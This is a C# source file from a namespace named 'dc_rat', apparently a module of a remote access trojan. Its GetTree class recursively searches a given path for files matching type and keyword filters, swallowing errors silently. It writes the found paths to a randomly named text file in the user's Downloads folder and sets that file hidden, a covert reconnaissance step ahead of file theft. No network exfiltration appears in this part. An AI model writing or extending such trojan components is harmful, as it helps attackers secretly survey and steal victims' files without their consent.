using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace dc_rat
{
    public static class GetTree
    {
        static string typeFilter = "";
        static string wordFilter = "";
        static string path = "";

        public static void Start(string TypeFilter, string WordFilter, string Path)
        {
            Path = Path.Replace("*", " ");
            WordFilter = WordFilter.Replace("#", "");

            path = Path;
            typeFilter = TypeFilter;
            wordFilter = WordFilter;

            foreach (string file in GetFiles(path))
            {
                Console.WriteLine(file);
                File.AppendAllText($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt", file + "\n");
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt", FileAttributes.Hidden);
            }
        }

        static IEnumerable<string> GetFiles(string path)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch { }

                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path, $"{typeFilter}");
                }
                catch { }

                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        if (files[i].Contains(wordFilter))
                        {
                            yield return files[i];
                        }
                    }
                }
            }
        }
    }
}
